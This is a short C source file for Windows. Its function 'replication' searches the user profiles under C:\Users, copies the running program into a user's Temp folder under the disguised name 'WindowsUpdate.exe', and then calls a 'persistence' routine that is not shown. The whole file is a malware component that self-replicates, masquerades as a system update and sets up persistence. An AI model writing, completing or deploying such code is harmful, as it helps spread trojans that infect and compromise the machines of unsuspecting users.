#include <stdio.h>
#include <windows.h>

int replication() {
	WIN32_FIND_DATAA findData;

	HANDLE hFind = FindFirstFileA("C:\\Users\\*", &findData);
	if (hFind == INVALID_HANDLE_VALUE) {
		printf("Search could not be started.Error code : % lu\n", GetLastError());
		return 1;
	}

	do {
		if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
			if (strcmp(findData.cFileName, ".") != 0 && strcmp(findData.cFileName, "..") != 0) {
				char tempPath[MAX_PATH];
				snprintf(tempPath, MAX_PATH, "C:\\Users\\%s\\AppData\\Local\\Temp\\WindowsUpdate.exe", findData.cFileName);
				// copy
				char currentPath[MAX_PATH];
				char *destinationPath = tempPath;

				DWORD pathLenght = GetModuleFileNameA(NULL, currentPath, MAX_PATH);

				if (pathLenght == 0) {
					printf("File path could not be retrieved!");
				}
				BOOL copyResult = CopyFileA(currentPath, destinationPath, FALSE);

				if (copyResult) {
					printf("Replication Successful! Path: %s\n\n", destinationPath);
						persistence(destinationPath);
						break;
				}
			}
		}
	} while (FindNextFileA(hFind, &findData) != 0);

	FindClose(hFind);

	return 0;
}
